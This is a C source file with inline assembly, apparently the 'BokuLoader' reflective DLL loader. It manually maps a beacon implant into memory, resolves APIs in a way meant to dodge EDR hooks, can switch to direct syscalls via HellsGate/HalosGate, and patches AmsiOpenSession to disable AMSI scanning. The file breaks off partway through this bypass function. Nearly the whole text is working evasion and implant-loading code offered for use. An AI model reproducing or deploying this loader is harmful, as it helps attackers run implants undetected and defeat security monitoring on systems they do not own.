#define WIN32_LEAN_AND_MEAN
/* Uncomment to enable features */
//#define NOHEADERCOPY // RDLL will not copy headers over to the loaded beacon
//#define BYPASS       // ETW & AMSI bypass switch. Comment out this line to disable
//#define SYSCALLS     // Use direct syscalls with HellGate & HalosGate instead of WINAPIs
#include <windows.h>

typedef struct Export {
    PVOID   Directory;
    ULONG32 DirectorySize;
    PVOID   AddressTable;
    PVOID   NameTable;
    PVOID   OrdinalTable;
    ULONG32 NumberOfNames;
}Export;

typedef struct Dll {
    void* dllBase;
    void* NewExeHeader;
    ULONG32 size;
    ULONG32 SizeOfHeaders;
    void* OptionalHeader;
    void* SizeOfOptionalHeader;
    void* NthSection;
    ULONG32 NumberOfSections;
    void* EntryPoint;
    void* TextSection;
    ULONG32 TextSectionSize;
    Export Export;
}Dll, *PDll;

typedef struct Section {
    void* RVA;
    void* dst_rdll_VA;
    void* src_rdll_VA;
    void* PointerToRawData;
    ULONG32 SizeOfSection;
    ULONG32 Characteristics;
}Section;

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

PVOID   getDllBase(LPCSTR);
PVOID   getFirstEntry(VOID);
PVOID   getNextEntry(PVOID currentEntry, PVOID firstEntry);
PVOID   getDllBaseFromEntry(PVOID entry);
USHORT  getMachineType(PVOID NewExeHeader);
VOID    Memcpy(PVOID destination, PVOID source, ULONG32 num);
PVOID   getExportDirectory(PVOID dllAddr);
ULONG   getExportDirectorySize(PVOID dllAddr);
PVOID   getExportAddressTable(PVOID dllBase, PVOID dllExportDirectory);
PVOID   getExportNameTable(PVOID dllBase, PVOID dllExportDirectory);
PVOID   getExportOrdinalTable(PVOID dllBase, PVOID dllExportDirectory);
ULONG32 getNumberOfNames(PVOID dllExportDirectory);
PVOID   getSymbolAddress(PVOID symbolStr, ULONG StrSize, PVOID dllBase, PVOID AddressTable, PVOID NameTable, PVOID OrdinalTable, ULONG32 NumberOfNames);
PVOID   xGetProcAddress(PVOID symbolStr, PDll dll);
PVOID   getRdllBase(PVOID);
PVOID   getNewExeHeader(PVOID dllBase);
ULONG32 getDllSize(PVOID newExeHeader);
ULONG32 getDllSizeOfHeaders(PVOID newExeHeader);
PVOID   getOptionalHeader(PVOID NewExeHeader);
PVOID   getSizeOfOptionalHeader(PVOID NewExeHeader);
PVOID   add(PVOID a, PVOID b);
ULONG32 getNumberOfSections(PVOID newExeHeaderAddr);
PVOID   getBeaconEntryPoint(PVOID newRdllAddr, PVOID OptionalHeaderAddr);
PVOID   getRip(VOID);
ULONG32 copyWithDelimiter(PVOID dst, PVOID src, ULONG32 n, CHAR delimiter);

#ifdef SYSCALLS
DWORD findSyscallNumber(PVOID ntdllApiAddr);
DWORD HellsGate(DWORD wSystemCall);
VOID  HellDescent(VOID);
DWORD halosGateDown(PVOID ntdllApiAddr, DWORD index);
DWORD halosGateUp(PVOID ntdllApiAddr, DWORD index);
DWORD getSyscallNumber(PVOID functionAddress);
#endif

typedef PVOID  (WINAPI * tLoadLibraryA)  (LPCSTR);

typedef LONG32 (NTAPI  * tNtProt)        (HANDLE, PVOID, PVOID, ULONG32, PVOID);
typedef LONG32 (NTAPI  * tNtAlloc)       (HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef LONG32 (NTAPI  * tNtFree)        (HANDLE, PVOID, PSIZE_T, ULONG);
typedef LONG32 (NTAPI  * tNtFlush)       (HANDLE, PVOID, ULONG32);

typedef void*  (WINAPI * DLLMAIN)        (HINSTANCE, ULONG32, PVOID);

#ifdef BYPASS
void  bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA, tNtProt pNtProtectVirtualMemory);
#endif

#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )

#ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) ((LONG32)(Status) >= 0)
#endif

__declspec(dllexport) void* WINAPI BokuLoader()
{
    LONG32 status;
    SIZE_T size;
    PVOID base;

    // get the current address
    PVOID BokuLoaderStart = getRip();

    // Initial Source Reflective DLL
    Dll rdll_src;
    rdll_src.dllBase              = getRdllBase(BokuLoaderStart); // search backwards from the start of BokuLoader
    rdll_src.NewExeHeader         = getNewExeHeader(rdll_src.dllBase);
    rdll_src.size                 = getDllSize(rdll_src.NewExeHeader);
    rdll_src.SizeOfHeaders        = getDllSizeOfHeaders(rdll_src.NewExeHeader);
    rdll_src.OptionalHeader       = getOptionalHeader(rdll_src.NewExeHeader);
    rdll_src.SizeOfOptionalHeader = getSizeOfOptionalHeader(rdll_src.NewExeHeader);
    rdll_src.NumberOfSections     = getNumberOfSections(rdll_src.NewExeHeader);

    // Get Export Directory and Export Tables for NTDLL.DLL
    char ws_ntdll[] = {'n','t','d','l','l','.','d','l','l',0};
    Dll ntdll;
    ntdll.dllBase              = getDllBase(ws_ntdll);
    ntdll.NewExeHeader         = getNewExeHeader(ntdll.dllBase);
    ntdll.Export.Directory     = getExportDirectory(ntdll.dllBase);
    ntdll.Export.DirectorySize = getExportDirectorySize(ntdll.dllBase);
    ntdll.Export.AddressTable  = getExportAddressTable(ntdll.dllBase, ntdll.Export.Directory);
    ntdll.Export.NameTable     = getExportNameTable(ntdll.dllBase, ntdll.Export.Directory);
    ntdll.Export.OrdinalTable  = getExportOrdinalTable(ntdll.dllBase, ntdll.Export.Directory);
    ntdll.Export.NumberOfNames = getNumberOfNames(ntdll.Export.Directory);

    // check that the rDLL is the same architecture as the host process
    if(getMachineType(rdll_src.NewExeHeader) != getMachineType(ntdll.NewExeHeader)) {
        return NULL;
    }

    // Get Export Directory and Export Tables for Kernel32.dll
    char ws_k32[] = {'K','E','R','N','E','L','3','2','.','D','L','L',0};
    Dll k32;
    k32.dllBase              = getDllBase(ws_k32);
    k32.Export.Directory     = getExportDirectory(k32.dllBase);
    k32.Export.DirectorySize = getExportDirectorySize(k32.dllBase);
    k32.Export.AddressTable  = getExportAddressTable(k32.dllBase, k32.Export.Directory);
    k32.Export.NameTable     = getExportNameTable(k32.dllBase, k32.Export.Directory);
    k32.Export.OrdinalTable  = getExportOrdinalTable(k32.dllBase, k32.Export.Directory);
    k32.Export.NumberOfNames = getNumberOfNames(k32.Export.Directory);

    char kstr1[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
    tLoadLibraryA pLoadLibraryA = xGetProcAddress(kstr1, &k32);

    char ntstr1[] = {'N','t','F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e',0};
    tNtFlush pNtFlushInstructionCache = xGetProcAddress(ntstr1, &ntdll);

    char ntstr2[] = {'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    tNtAlloc pNtAllocateVirtualMemory = xGetProcAddress(ntstr2, &ntdll);

    char ntstr3[] = {'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    tNtProt pNtProtectVirtualMemory = xGetProcAddress(ntstr3, &ntdll);

    #ifdef NOHEADERCOPY
    char ntstr4[] = {'N','t','F','r','e','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    tNtFree pNtFreeVirtualMemory = xGetProcAddress(ntstr4, &ntdll);
    #endif

    // AMSI & ETW Optional Bypass
    #ifdef BYPASS
    bypass(&ntdll, &k32, pLoadLibraryA, pNtProtectVirtualMemory);
    #endif

    // Allocate new memory to write our new RDLL too
    Dll rdll_dst;
    rdll_dst.dllBase = NULL;
    base = NULL;
    size = rdll_src.size;
    #ifdef SYSCALLS
    HellsGate(getSyscallNumber(pNtAllocateVirtualMemory));
    status = ((tNtAlloc)HellDescent)(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
    #else
    status = pNtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
    #endif
    if (!NT_SUCCESS(status))
        return NULL;

    rdll_dst.dllBase = base;

    // Optionally write Headers from initial source RDLL to loading beacon destination memory
    #ifdef NOHEADERCOPY
    base = rdll_dst.dllBase;
    size = 1;
    // Deallocate the first memory page (4096/0x1000 bytes)
    #ifdef SYSCALLS
    HellsGate(getSyscallNumber(pNtFreeVirtualMemory));
    status = ((tNtFree)HellDescent)(NtCurrentProcess(), &base, &size, MEM_RELEASE);
    #else
    status = pNtFreeVirtualMemory(NtCurrentProcess(), &base, &size, MEM_RELEASE);
    #endif
    if (!NT_SUCCESS(status))
        return NULL;
    #else
    Memcpy(rdll_dst.dllBase, rdll_src.dllBase, rdll_src.SizeOfHeaders);
    #endif

    // Save .text section address and size for destination RDLL so we can make it RE later
    BOOL textSectionFlag = FALSE;
    rdll_dst.TextSection = NULL;
    rdll_dst.TextSectionSize = 0;
    __int64 numberOfSections = (__int64)rdll_src.NumberOfSections;
    rdll_src.NthSection      = add(rdll_src.OptionalHeader, rdll_src.SizeOfOptionalHeader);
    Section section;
    while( numberOfSections-- )
    {
        __asm__(
            "add rax, 0xC \n"   // offsetof(IMAGE_SECTION_HEADER, VirtualAddress)
            "xor rbx, rbx \n"
            "mov ebx, [rax] \n"
            "xchg rax, rbx \n"
            : "=r" (section.RVA)        // RAX OUT
            : "r" (rdll_src.NthSection) // RAX IN
        );
        section.dst_rdll_VA = add(rdll_dst.dllBase, section.RVA);
        __asm__(
            "add rax, 0x14 \n"  // offsetof(IMAGE_SECTION_HEADER, PointerToRawData)
            "xor rbx, rbx \n"
            "mov ebx, [rax] \n"
            "xchg rax, rbx \n"
            : "=r" (section.PointerToRawData) // RAX OUT
            : "r" (rdll_src.NthSection)       // RAX IN
        );
        section.src_rdll_VA = add(rdll_src.dllBase, section.PointerToRawData);
        __asm__(
            "add rax, 0x10 \n"  // offsetof(IMAGE_SECTION_HEADER, SizeOfRawData)
            "xor rbx, rbx \n"
            "mov ebx, [rax] \n"
            "xchg rax, rbx \n"
            : "=r" (section.SizeOfSection) // RAX OUT
            : "r" (rdll_src.NthSection)    // RAX IN
        );
        // check if this is the .text section
        if (textSectionFlag == FALSE)
        {
            __asm__(
                "mov rbx, [rax] \n"        // name of the section
                "xor rax, rax \n"
                "mov rdx, 0x747865742e \n" // 0x747865742e == '.text'
                "cmp rbx, rdx \n"
                "jne nottext \n"
                "mov rax, 0x1 \n"
                "nottext: \n"
                : "=r" (textSectionFlag)    // RAX OUT
                : "r" (rdll_src.NthSection) // RAX IN
            );
            // Save the .text section address & size for later so we can change it from RW to RE. This has to be done after we do relocations
            if(textSectionFlag == TRUE)
            {
                rdll_dst.TextSection = section.dst_rdll_VA;
                rdll_dst.TextSectionSize = section.SizeOfSection;
            }
        }
        // Copy the section from the source address to the destination for the size of the section
        Memcpy(section.dst_rdll_VA, section.src_rdll_VA, section.SizeOfSection);
        // Get the address of the next section header and loop until there are no more sections
        rdll_src.NthSection += 0x28; // sizeof( IMAGE_SECTION_HEADER ) = 0x28
    }
    // Get the address of our RDLL's Import Directory entry in within the Data Directory of the Optional Header
    void* DataDirectory = rdll_src.OptionalHeader + 0x78;
    // Get the Address of the Import Directory from the Data Directory
    void *ImportDirectory, *importEntryHint, *BaseOrdinal, *TableIndex, *EntryAddress, *importNameRVA, *LookupTableEntry, *AddressTableEntry, *EntryName, *nullCheck;
    LPCSTR importName;
    __asm__(
        "xor rbx, rbx \n"
        "mov ebx, [rax] \n" // RVA of Import Directory
        "add rdx, rbx \n"   // Import Directory of beacon = RVA of Import Directory + New RDLL Base Address
        "xchg rax, rdx \n"
        : "=r" (ImportDirectory) // RAX OUT
        : "r" (DataDirectory),   // RAX IN
          "r" (rdll_dst.dllBase) // RDX IN
    );
    void* nImportDesc = ImportDirectory;
    Dll dll_import;
    __asm__(
        "xor rbx, rbx \n"
        "add rdx, 0xC \n"   // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
        "mov ebx, [rdx] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
        "mov rdx, rbx \n"
        "add rax, rdx \n"        // Address of Module String = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
        : "=r" (importNameRVA),   // RDX OUT
          "=r" (importName)       // RAX OUT
        : "r" (rdll_dst.dllBase), // RAX IN
          "r" (nImportDesc)       // RDX IN
    );
    // The last entry in the image import directory is all zeros
    while(importNameRVA)
    {
        dll_import.dllBase = getDllBase(importName);
        // If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
        if (dll_import.dllBase == NULL){
            dll_import.dllBase = pLoadLibraryA(importName);
        }
        __asm__(
            "xor rbx, rbx \n"   // importLookupTableEntry = VA of the OriginalFirstThunk
            "mov ebx, [rax] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into EBX
            "add rbx, rdx \n"   // importLookupTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk
            "xchg rax, rbx \n"
            : "=r" (LookupTableEntry) // RAX OUT
            : "r" (nImportDesc),      // RAX IN        
              "r" (rdll_dst.dllBase)  // RDX IN
        );
        __asm__(
            "xor rbx, rbx \n"   // importAddressTableEntry = VA of the IAT (via first thunk not origionalfirstthunk)
            "add rax, 0x10 \n"  // 16 (0x10) byte offset is the address of the DWORD FirstThunk within the image import descriptor
            "mov ebx, [rax] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into EBX
            "add rbx, rdx \n"   // importAddressTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk
            "xchg rax, rbx \n"
            : "=r" (AddressTableEntry) // RAX OUT
            : "r" (nImportDesc),       // RAX IN
              "r" (rdll_dst.dllBase)   // RDX IN
        );
        __asm__(
            "mov rax, [rax] \n"
            : "=r" (nullCheck)        // RAX OUT
            : "r" (AddressTableEntry) // RAX IN
        );
        while(nullCheck)
        {
            dll_import.Export.Directory     = getExportDirectory(dll_import.dllBase);
            dll_import.Export.DirectorySize = getExportDirectorySize(dll_import.dllBase);
            dll_import.Export.AddressTable  = getExportAddressTable(dll_import.dllBase, dll_import.Export.Directory);
            dll_import.Export.NameTable     = getExportNameTable(dll_import.dllBase, dll_import.Export.Directory);
            dll_import.Export.OrdinalTable  = getExportOrdinalTable(dll_import.dllBase, dll_import.Export.Directory);
            dll_import.Export.NumberOfNames = getNumberOfNames(dll_import.Export.Directory);

            if( LookupTableEntry && ((PIMAGE_THUNK_DATA)LookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
            {
                __asm__( // Export Base Ordinal from the Export Directory of the module/dll being imported (0x10 offset)
                    "xor rdx, rdx \n"   // located in the Export Directory in memory of the module which functions/api's are being imported
                    "add rax, 0x10 \n"  // DWORD Base; // 0x10 offset // RCX = &importedDllBaseOrdinal
                    "mov edx, [rax] \n" // RAX = importedDllBaseOrdinal (Value/DWORD)
                    "xchg rax, rdx \n"
                    : "=r" (BaseOrdinal)                // RAX OUT
                    : "r" (dll_import.Export.Directory) // RAX IN
                );
                __asm__( // Import Hint from the modules Hint/Name table
                    "mov rax, [rax] \n"  // RAX = 8000000000000013. 13 is the original Thunk, now we need to get rid of the 8
                    "and eax, 0xFFFF \n" // get rid of the 8
                    : "=r" (importEntryHint) // RAX OUT
                    : "r" (LookupTableEntry) // RAX IN
                );
                __asm__( // Use the import entries Hint and the Imported Modules Base Ordinal from its Export Directory to find the index of our entry/import within the Export Address Table
                    "sub rax, rdx \n" // Import Hint from Hint/Name Table (first 2 bytes before the name string)
                    : "=r" (TableIndex)      // RAX OUT
                    : "r" (importEntryHint), // RAX IN
                      "r" (BaseOrdinal)      // RDX IN
                );
                __asm__( // The ExportAddressTable/AddressOfFunctions holds DWORD (4 byte) RVA's for the executable functions/api's address
                    "mov r12, rdx \n"
                    "xor rbx, rbx \n"
                    "add bl, 0x4 \n"    // sizeof(DWORD) - This is because each entry in the table is a 4 byte DWORD which is the RVA/offset for the actual executable functions address
                    "mul rbx \n"        // importEntryExportTableIndex * sizeof(DWORD)
                    "add rax, r12 \n"   // RVA for our functions address
                    "xor rbx, rbx \n"
                    "mov ebx, [rax] \n" // The RVA for the executable function we are importing
                    "add rcx, rbx \n"   // The executable address within the imported DLL for the function we imported
                    "xchg rax, rcx \n"
                    : "=r" (EntryAddress)                  // RAX OUT
                    : "r"(TableIndex),                     // RAX IN - importEntryExportTableIndex
                      "r"(dll_import.Export.AddressTable), // RDX IN - AddressTable
                      "r" (dll_import.dllBase)             // RCX IN - dllBase
                );
                // patch in the address for this imported function
                __asm__(
                    "mov [rax], rdx \n" // write the address of the imported api to our import table
                    : // no outputs
                    : "r" (AddressTableEntry), // RAX IN = The import table entry we are going to overwrite
                      "r" (EntryAddress)       // RDX IN
                 );
            }
            else
            {
                __asm__( // If there was no ordinal/hint to import then import via the name from the import tables Hint/Name Table for the imported module
                    "mov rax, [rax] \n" // RVA for our functions Name/Hint table entry
                    "add rax, rdx \n"   // VA (Address in memory) Name/Hint Entry = RVA Name/Hint Entry + New RDLL Address
                    "add rax, 0x2 \n"   // The hint is the first 2 bytes, then its followed by the name string for our import. We need to drop the first 2 bytes so we just have the name string
                    : "=r" (EntryName)         // RAX OUT
                    : "r" (AddressTableEntry), // RAX IN, import table entry we are going to overwrite / The RVA for our functions Name/Hint Table entry
                      "r" (rdll_dst.dllBase)   // RDX IN
                );
                // use xGetProcAddress to dodge EDR hooks on GetProcAddress() and patch in the address for this imported function
                EntryAddress = xGetProcAddress(EntryName, &dll_import);
                __asm__(
                    "mov [rax], rdx \n" // write the address of the imported api to our import table
                    : // no outputs
                    : "r" (AddressTableEntry), // RAX OUT, import table entry we are going to overwrite
                      "r" (EntryAddress)       // RDX IN
                );
            }
            AddressTableEntry += 0x8;
            if(LookupTableEntry)
                LookupTableEntry += 0x8;
            __asm__(
                "mov rax, [rax] \n"
                : "=r" (nullCheck)        // RAX OUT
                : "r" (AddressTableEntry) // RAX IN
            );
        }
        nImportDesc += 0x14; // 0x14 = 20 = sizeof( IMAGE_IMPORT_DESCRIPTOR )
        __asm__( // Do this again for the next module/DLL in the Import Directory
            "xor rbx, rbx \n"
            "add rax, 0xC  \n"  // 12(0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
            "mov ebx, [rax] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name
            "mov rax, rbx \n"   // RVA of Name DLL
            "add rdx, rax \n"   // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
            : "=r" (importName),     // RDX OUT
              "=r" (importNameRVA)   // RAX OUT
            : "r" (nImportDesc),     // RAX IN
              "r" (rdll_dst.dllBase) // RDX IN
        );
    }
    void* nextRelocBlock, *RelocDirSize, *BaseAddressDelta, *relocBlockSize, *relocVA, *RelocBlockEntries, *nextRelocBlockEntry;
    __asm__(
        "add rdx, 0x18 \n"  // OptionalHeader.ImageBase
        "mov rdx, [rdx] \n"
        "sub rax, rdx \n"   // dllBase.ImageBase
        : "=r" (BaseAddressDelta)       // RAX OUT
        : "r" (rdll_dst.dllBase),       // RAX IN
          "r" (rdll_src.OptionalHeader) // RDX IN
    );
    void* RelocDir = rdll_src.OptionalHeader + 0x98; // OptionalHeader+0x98 = &DataDirectory[Base Relocation Table]
    __asm__(
        "xor rbx, rbx \n"
        "mov ebx, [rdx] \n" // 4 byte DWORD Virtual Address of the Relocation Directory table
        "add rax, rbx \n"   // newRelocationTableAddr = dllBase + RVAnewRelocationTable
        : "=r" (nextRelocBlock)   // RAX OUT
        : "r" (rdll_dst.dllBase), // RAX IN
          "r" (RelocDir)          // RDX IN
    );
    __asm__(
        "xor rbx, rbx \n"
        "mov ebx, [rax+0x4] \n" // 4 byte DWORD Size of the Relocation Directory table
        "xchg rax, rbx \n"
        : "=r" (RelocDirSize) // RAX OUT
        : "r" (RelocDir)      // RAX IN
    );

    if(RelocDirSize && BaseAddressDelta) // check if their are any relocations present
    {
        __asm__(
            "xor rbx, rbx \n"
            "mov ebx, [rax+0x4] \n" // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
            "xchg rax, rbx \n"
            : "=r" (relocBlockSize) // RAX OUT
            : "r" (nextRelocBlock)  // RAX IN
        );
        while(relocBlockSize)
        {
            __asm__(
                "xor rbx, rbx \n"
                "mov ebx, [rdx] \n" // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->VirtualAddress
                "add rax, rbx \n"   // &reflectiveDll.dll + nextRelocationBlockRVA = VA of next Relocation Block
                : "=r" (relocVA)          // RAX OUT
                : "r" (rdll_dst.dllBase), // RAX IN
                  "r" (nextRelocBlock)    // RDX IN
            );
            __asm__(
                "xor rdx, rdx \n"
                "mov rbx, 0x2 \n" // 0x2 = size of image relocation WORD
                "sub ax, 0x8 \n"  // Minus the 8 byte IMAGE_BASE_RELOCATION structure which tells us the RVA for the block and the blocksize
                "div bx \n"       // relocBlockSize/2
                : "=r" (RelocBlockEntries) // RAX OUT
                : "r" (relocBlockSize)     // RAX IN
            );
            nextRelocBlockEntry = nextRelocBlock + 0x8;
            while( RelocBlockEntries-- )
            {
                __asm__(
                    "xor rbx, rbx \n"
                    "mov bx, [rax] \n"  // 2 byte value for the Relocation Entry (with the 4 bit type and 12 bit offset)
                    "mov rax, rbx \n"
                    "shr rbx, 0x0C \n"  // Check the 4 bit type
                    "cmp bl, 0x0A \n"   // IMAGE_REL_BASED_DIR64?
                    "jne badtype \n"
                    "shl rax, 0x34 \n"  // only keep the last 12 bits of RAX by shaking the RAX register
                    "shr rax, 0x34 \n"  // the last 12 bits is the offset, the first 4 bits is the type
                    "add rdx, rax \n"   // in memory Virtual Address of our current relocation entry
                    "mov rbx, [rdx] \n" // value of the relocation entry
                    "add rbx, rcx \n"   // value of our relocation entry + the hardcoded Addr:Our Real in memory VA delta we calculated earlier
                    "mov [rdx], rbx \n" // WRITE THAT RELOC!
                    "badtype:\n"
                    : // no outputs
                    : "r" (nextRelocBlockEntry), // RAX IN
                      "r" (relocVA),             // RDX IN
                      "r" (BaseAddressDelta)     // RCX IN
                );
                nextRelocBlockEntry += 0x2;
            }
            nextRelocBlock = add(nextRelocBlock, relocBlockSize);
            __asm__(
                "xor rbx, rbx \n"
                "mov ebx, [rax+0x4] \n" // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
                "xchg rax, rbx \n"
                : "=r" (relocBlockSize) // RAX OUT
                : "r" (nextRelocBlock)  // RAX IN
            );
        }
    }

    ULONG32 oldprotect = 0;
    base = rdll_dst.TextSection;
    size = rdll_dst.TextSectionSize;
    #ifdef SYSCALLS
    HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
    status = ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, &oldprotect);
    if (!NT_SUCCESS(status))
        return NULL;

    HellsGate(getSyscallNumber(pNtFlushInstructionCache));
    status = ((tNtFlush)HellDescent)(NtCurrentProcess(), NULL, 0);
    if (!NT_SUCCESS(status))
        return NULL;
    #else
    status = pNtProtectVirtualMemory(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, &oldprotect);
    if (!NT_SUCCESS(status))
        return NULL;

    status = pNtFlushInstructionCache(NtCurrentProcess(), NULL, 0);
    if (!NT_SUCCESS(status))
        return NULL;
    #endif

    rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_src.OptionalHeader);
    ((DLLMAIN)rdll_dst.EntryPoint)( rdll_dst.dllBase, DLL_PROCESS_ATTACH, NULL);
    return rdll_dst.EntryPoint;
}

PVOID xGetProcAddress(PVOID symbolStr, PDll dll)
{
    CHAR  dll_name[64];
    CHAR  api_name[128];
    DWORD api_length, i;
    Dll   ref_dll;
    PVOID firstEntry;
    PVOID currentEntry;
    DWORD StrSize;

    // if there is no export directory, return NULL
    if (!dll->Export.DirectorySize)
        return NULL;

    __asm__(
        "xor rcx, rcx \n"        // Get the string length for the import function name
        "countLoop: \n"
        "inc cl \n"              // increment the name string length counter
        "xor rbx, rbx \n"
        "cmp bl, [rax] \n"       // are we at the null terminator for the string?
        "je fStrLen \n"
        "inc rax \n"             // move to the next char of the string
        "jmp short countLoop \n"
        "fStrLen: \n"
        "xchg rax, rcx \n"
        : "=r" (StrSize)  // RAX OUT
        : "r" (symbolStr) // RAX IN
    );

    PVOID address = getSymbolAddress(symbolStr, StrSize, dll->dllBase, dll->Export.AddressTable, dll->Export.NameTable, dll->Export.OrdinalTable, dll->Export.NumberOfNames);

    // if not found, return NULL
    if (!address)
        return NULL;

    // is this a forward reference?
    if ((ULONG_PTR)address >= (ULONG_PTR)dll->Export.Directory &&
        (ULONG_PTR)address <  (ULONG_PTR)dll->Export.Directory + dll->Export.DirectorySize)
    {
        // copy DLL name
        i = copyWithDelimiter(dll_name, address, sizeof(dll_name) - 4, '.');
        i--;
        dll_name[i+1] = 'd';
        dll_name[i+2] = 'l';
        dll_name[i+3] = 'l';
        dll_name[i+4] = 0;

        address += i + 1;

        // copy API name
        i = copyWithDelimiter(api_name, address, sizeof(api_name) - 1, 0);
        i--;
        api_name[i] = 0;
        api_length = i + 1;

        // see if the DLL is already loaded
        ref_dll.dllBase = getDllBase(dll_name);
        if (ref_dll.dllBase)
        {
            ref_dll.Export.Directory     = getExportDirectory(ref_dll.dllBase);
            ref_dll.Export.AddressTable  = getExportAddressTable(ref_dll.dllBase, ref_dll.Export.Directory);
            ref_dll.Export.NameTable     = getExportNameTable(ref_dll.dllBase, ref_dll.Export.Directory);
            ref_dll.Export.OrdinalTable  = getExportOrdinalTable(ref_dll.dllBase, ref_dll.Export.Directory);
            ref_dll.Export.NumberOfNames = getNumberOfNames(ref_dll.Export.Directory);
            return xGetProcAddress(api_name, &ref_dll);
        }

        // the DLL was not found by name
        // loop over each loaded DLL until we find the correct one
        firstEntry = getFirstEntry();
        currentEntry = firstEntry;
        do
        {
            ref_dll.dllBase = getDllBaseFromEntry(currentEntry);
            // ignore the original DLL with the reference
            if (ref_dll.dllBase == dll->dllBase)
            {
                currentEntry = getNextEntry(currentEntry, firstEntry);
                continue;
            }

            ref_dll.Export.Directory     = getExportDirectory(ref_dll.dllBase);
            ref_dll.Export.DirectorySize = getExportDirectorySize(ref_dll.dllBase);
            // make sure it has an export directory
            if (!ref_dll.Export.DirectorySize)
            {
                currentEntry = getNextEntry(currentEntry, firstEntry);
                continue;
            }
            ref_dll.Export.AddressTable  = getExportAddressTable(ref_dll.dllBase, ref_dll.Export.Directory);
            ref_dll.Export.NameTable     = getExportNameTable(ref_dll.dllBase, ref_dll.Export.Directory);
            ref_dll.Export.OrdinalTable  = getExportOrdinalTable(ref_dll.dllBase, ref_dll.Export.Directory);
            ref_dll.Export.NumberOfNames = getNumberOfNames(ref_dll.Export.Directory);
            // try to find 'api_name' in this DLL
            address = getSymbolAddress(api_name, api_length, ref_dll.dllBase, ref_dll.Export.AddressTable, ref_dll.Export.NameTable, ref_dll.Export.OrdinalTable, ref_dll.Export.NumberOfNames);
            // found?
            if (address)
                break;
            // try the next DLL
            currentEntry = getNextEntry(currentEntry, firstEntry);
        } while(currentEntry);
    }

    return address;
}

#ifdef BYPASS
void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA, tNtProt pNtProtectVirtualMemory){
    LONG32 status;
    PVOID Base;
    SIZE_T Size;
    unsigned long oldprotect;

    // ######### AMSI.AmsiOpenSession Bypass
    char as[] = {'a','m','s','i','.','d','l','l',0};
    Dll amsi;
    amsi.dllBase = getDllBase(as); // check if amsi.dll is already loaded into the process
    if (amsi.dllBase == NULL){ // If the AMSI.DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
        amsi.dllBase = pLoadLibraryA(as);
    }

    if (amsi.dllBase != NULL) {
        amsi.Export.Directory     = getExportDirectory(amsi.dllBase);
        amsi.Export.AddressTable  = getExportAddressTable(amsi.dllBase, amsi.Export.Directory);
        amsi.Export.NameTable     = getExportNameTable(amsi.dllBase, amsi.Export.Directory);
        amsi.Export.OrdinalTable  = getExportOrdinalTable(amsi.dllBase, amsi.Export.Directory);
        amsi.Export.NumberOfNames = getNumberOfNames(amsi.Export.Directory);
        char aoses[] = {'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0};
        void* pAmsiOpenSession  = xGetProcAddress(aoses, &amsi);
        if (pAmsiOpenSession) {

            unsigned char amsibypass[] = { 0x48, 0x31, 0xC0 }; // xor rax, rax
            Base = pAmsiOpenSession;
            Size = sizeof(amsibypass);

            #ifdef SYSCALLS
            // make memory region RWX
            HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
            status = ((tNtProt)HellDescent)(NtCurrentProcess(), &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!NT_SUCCESS(status))
                return;
            // write the bypass
            Memcpy(pAmsiOpenSession, amsibypass, sizeof(amsibypass));
            // make memory region RX again
            HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
            status = ((tNtProt)HellDescent)(NtCurrentProcess(), &Base, &Size, oldprotect, &oldprotect);
            if (!NT_SUCCESS(status))
                return;
            #else
            // make memory region RWX
            status = pNtProtectVirtualMemory(NtCurrentProcess(), &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!NT_SUCCESS(status))
                return;
            // write the bypass
            Memcpy(pAmsiOpenSession, amsibypass, sizeof(amsibypass));
            // make memory region RX again
            status = pNtProtectVirtualMemory(NtCurrentProcess(), &Base, &Size, oldprotect, &oldprotect);
